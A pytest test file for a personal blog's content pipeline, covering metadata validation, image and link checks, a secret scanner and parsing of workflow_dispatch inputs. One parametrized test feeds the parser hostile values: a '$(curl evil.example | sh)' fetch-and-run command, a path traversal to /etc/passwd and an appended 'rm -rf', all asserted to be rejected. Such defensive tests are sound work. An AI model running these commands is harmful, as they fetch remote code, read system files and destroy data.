from __future__ import annotations

import json
from pathlib import Path

import optimize_images
import pytest
import validate_content
from lib import content
from lib.common import load_policy
from lib.dispatch import DispatchError, parse
from lib.secretscan import scan as secret_scan
from lib.taxonomy import Taxonomy
from PIL import Image

from tests.conftest import make_meta, write_bundle

EMPTY = {"description": "", "summary": "", "keywords": [], "categories": [], "tags": []}


def issues(repo: Path, **meta) -> list[content.Issue]:
    policy = load_policy()
    return content.validate_meta(policy, Taxonomy(policy.taxonomy), make_meta(**meta))


def test_published_article_with_missing_metadata_fails(repo: Path) -> None:
    write_bundle(repo, "en", "2026-10-01-gaps", **EMPTY)
    assert validate_content.main([]) == 1
    assert validate_content.main(["--allow-pending"]) == 1, "auto_enrich is off, so nothing will fill the gaps"


def test_pending_enrichment_is_allowed_only_in_isolated_checks(repo: Path, capsys) -> None:
    write_bundle(repo, "en", "2026-10-01-pending", auto_enrich=True, **EMPTY)
    assert validate_content.main(["--allow-pending"]) == 0
    assert "[pending]" in capsys.readouterr().out
    assert validate_content.main([]) == 1, "production validation requires completed enrichment"


def test_drafts_with_gaps_do_not_block(repo: Path) -> None:
    write_bundle(repo, "en", "2026-10-01-draft", draft=True, auto_enrich=True, **EMPTY)
    assert validate_content.main([]) == 0


def test_summary_and_description_are_both_required_for_publication(repo: Path) -> None:
    codes = {i.code for i in issues(repo, summary="") if i.severity == "error"}
    assert codes == {"summary"}
    codes = {i.code for i in issues(repo, description="") if i.severity == "error"}
    assert codes == {"description"}


def test_flags_must_be_booleans_and_dates_rfc3339(repo: Path) -> None:
    codes = {
        i.code
        for i in issues(repo, draft="false", date="13.11.2026", series=["A"], series_order="1")
        if i.severity == "error"
    }
    assert {"not-boolean", "date", "series_order"} <= codes
    assert not [i for i in issues(repo, expiryDate="") if i.severity == "error"], (
        "an empty expiry written by the CMS is tolerated"
    )


def test_broken_references_and_unsupported_markup_fail(repo: Path, capsys) -> None:
    body = (
        "![ok](real.png)\n\n![missing](gone.png)\n\n![](real.png)\n\n![escape](../other/x.png)\n\n![abs](/images/x.png)\n\n"
        '![remote](https://example.com/x.png)\n\n<img src="real.png">\n\n{{< figure src="real.png" >}}\n\n[file](gone.pdf)\n\n'
        "```md\n![fenced](also-gone.png)\n```\n"
    )
    path = write_bundle(repo, "en", "2026-10-01-refs", body)
    Image.new("RGB", (10, 10)).save(path.parent / "real.png")
    assert validate_content.main(["--json"]) == 1
    report = json.loads(capsys.readouterr().out)
    text = " ".join(report["items"][0]["errors"])
    for expected in (
        "gone.png",
        "no alt text",
        "inside the page bundle",
        "site-absolute",
        "remote image",
        "raw HTML <img",
        "shortcode 'figure'",
        "gone.pdf",
    ):
        assert expected in text, expected
    assert "also-gone.png" not in text, "image syntax inside a code fence is ignored"


def test_feature_image_conflicts_ask_for_a_metadata_choice(repo: Path) -> None:
    policy = load_policy()
    path = write_bundle(repo, "en", "2026-10-01-feature")
    for name in ("feature.jpg", "cover.png"):
        Image.new("RGB", (10, 10)).save(path.parent / name)
    found = content.validate_bundle_files(policy, content.resolve_bundle(policy, path))
    assert any(i.code == "feature-conflict" and "featureimage" in i.message for i in found)
    path = write_bundle(repo, "en", "2026-10-01-feature", featureimage="cover.png")
    assert not [
        i for i in content.validate_bundle_files(policy, content.resolve_bundle(policy, path)) if i.severity == "error"
    ]
    hero = write_bundle(repo, "en", "2026-10-02-hero")
    Image.new("RGB", (10, 10)).save(hero.parent / "hero.jpg")
    assert any(
        i.code == "feature-hero" for i in content.validate_bundle_files(policy, content.resolve_bundle(policy, hero))
    )
    assert (hero.parent / "hero.jpg").exists() and (path.parent / "feature.jpg").exists(), (
        "nothing is deleted to satisfy a convention"
    )


def test_slug_and_translation_key_collisions(repo: Path, capsys) -> None:
    write_bundle(repo, "en", "2026-10-01-same")
    write_bundle(repo, "en", "2026-10-02-other", slug="same")
    write_bundle(repo, "no", "2026-10-01-same")
    assert validate_content.main([]) == 1
    out = capsys.readouterr().out
    assert out.count("is also used by") == 1, "the same slug in the other language is not a collision"


def test_image_audit_classifies_and_enforces_limits(repo: Path, capsys) -> None:
    path = write_bundle(
        repo, "en", "2026-10-01-images", "![a](photo.jpg)\n\n![b](shot.png)\n\n![c](anim.gif)\n\n![d](big.webp)\n"
    )
    Image.new("RGB", (3000, 2000), "red").save(path.parent / "photo.jpg")
    Image.new("RGBA", (800, 600), (0, 0, 0, 0)).save(path.parent / "shot.png")
    frames = [Image.new("RGB", (50, 50), c) for c in ("red", "blue")]
    frames[0].save(path.parent / "anim.gif", save_all=True, append_images=frames[1:])
    Image.new("RGB", (2400, 100), "blue").save(path.parent / "big.webp")
    (path.parent / "broken.png").write_bytes(b"not an image")
    before = {p.name: p.read_bytes() for p in path.parent.iterdir()}
    assert optimize_images.main(["--json"]) == 1
    items = {Path(i["path"]).name: i for i in json.loads(capsys.readouterr().out)["items"]}
    assert items["photo.jpg"]["delivery"] == "photo" and "never upscaled" in items["photo.jpg"]["notes"][0]
    assert items["shot.png"]["delivery"] == "lossless"
    assert items["anim.gif"]["delivery"] == "passthrough" and items["anim.gif"]["animated"] is True
    assert items["big.webp"]["status"] == "error" and "served unchanged" in items["big.webp"]["reason"]
    assert items["broken.png"]["status"] == "error"
    assert {p.name: p.read_bytes() for p in path.parent.iterdir()} == before, "the audit never rewrites a source image"


# ---------- workflow_dispatch input ----------

KW = {"repository": "bgronas/bengt.no", "ref": "refs/heads/main", "origin": "https://bengt.no"}


def payload(**overrides) -> str:
    data = {
        "source": "pages-cms",
        "action": {"name": "process-and-deploy"},
        "repository": {"owner": "bgronas", "repo": "bengt.no", "ref": "main"},
    }
    data.update(overrides)
    return json.dumps(data)


def test_dispatch_accepts_known_values_only() -> None:
    assert parse("", "", "", **KW) == {"mode": "full", "regenerate": ""}
    assert (
        parse("social-only", "https://bengt.no/posts/a/, content/en/posts/2026-10-01-a/index.md", "", **KW)[
            "regenerate"
        ].count(",")
        == 1
    )
    assert parse("social-only", "", payload(), **KW)["mode"] == "full", "a CMS button cannot choose an arbitrary mode"


@pytest.mark.parametrize(
    ("mode", "regenerate", "body", "ref"),
    [
        ("full", "", "", "refs/heads/feature"),
        ("deploy-everything", "", "", "refs/heads/main"),
        ("full", "$(curl evil.example | sh)", "", "refs/heads/main"),
        ("full", "content/en/posts/../../../etc/passwd", "", "refs/heads/main"),
        ("full", "https://evil.example/posts/a/", "", "refs/heads/main"),
        ("full", "https://bengt.no/posts/a/;rm -rf .", "", "refs/heads/main"),
        ("full", "", "{not json", "refs/heads/main"),
        ("full", "", payload(source="someone-else"), "refs/heads/main"),
        ("full", "", payload(repository={"owner": "other", "repo": "bengt.no", "ref": "main"}), "refs/heads/main"),
        (
            "full",
            "",
            payload(repository={"owner": "bgronas", "repo": "bengt.no", "ref": "draft-branch"}),
            "refs/heads/main",
        ),
        ("full", "", payload(action={"name": "delete-everything"}), "refs/heads/main"),
    ],
)
def test_dispatch_rejects_everything_else(mode: str, regenerate: str, body: str, ref: str) -> None:
    with pytest.raises(DispatchError):
        parse(mode, regenerate, body, repository=KW["repository"], ref=ref, origin=KW["origin"])


def test_secret_scan_reports_names_not_values() -> None:
    key = "sk-ant-" + "a1B2" * 12
    diff = f"+++ b/notes.md\n+token = {key}\n+++ b/ok.md\n+nothing here\n-sk-ant-{'z' * 40}\n"
    found = secret_scan(diff)
    assert found == ["  notes.md: Anthropic API key"]
    assert key not in "".join(found)


class FakeLinkClient:
    """Stand-in for httpx.Client: answers from a table and records every request."""

    def __init__(self, table: dict[str, object]) -> None:
        self.table = table
        self.requests: list[tuple[str, str]] = []

    def _answer(self, method: str, url: str) -> object:
        import httpx

        self.requests.append((method, url))
        answer = self.table[url]
        if isinstance(answer, Exception):
            raise answer
        return httpx.Response(int(str(answer)), request=httpx.Request(method, url))

    def head(self, url: str) -> object:
        return self._answer("HEAD", url)

    def get(self, url: str) -> object:
        return self._answer("GET", url)


def test_external_link_check_separates_missing_from_inconclusive_and_is_rate_limited(repo: Path) -> None:
    import httpx

    body = (
        "[ok](https://one.example/ok) [gone](https://one.example/gone#part) [blocked](https://two.example/blocked)\n"
        "[slow](https://three.example/slow) [down](https://four.example/down) [local](other.md)\n\n"
        "```text\n[in code](https://code.example/never)\n```\n"
    )
    write_bundle(repo, "en", "2026-10-01-links", body=body)
    table: dict[str, object] = {
        "https://one.example/ok": 200,
        "https://one.example/gone": 404,
        "https://two.example/blocked": 403,
        "https://three.example/slow": httpx.ReadTimeout("slow"),
        "https://four.example/down": httpx.ConnectError("down"),
    }
    client, pauses = FakeLinkClient(table), []
    report = validate_content.check_links(load_policy(), client=client, sleep=pauses.append)
    status = {item["path"]: item["status"] for item in report.as_dict()["items"]}
    assert status == {
        "https://one.example/ok": "ok",
        "https://one.example/gone": "missing",
        "https://two.example/blocked": "inconclusive",
        "https://three.example/slow": "timeout",
        "https://four.example/down": "unreachable",
    }, "only 404 and 410 are proven missing; links in code and local links are not requested"
    assert ("GET", "https://two.example/blocked") in client.requests, "a refused HEAD is retried as GET"
    assert len(pauses) == 1 and pauses[0] > 0, "the second request to the same host waits"
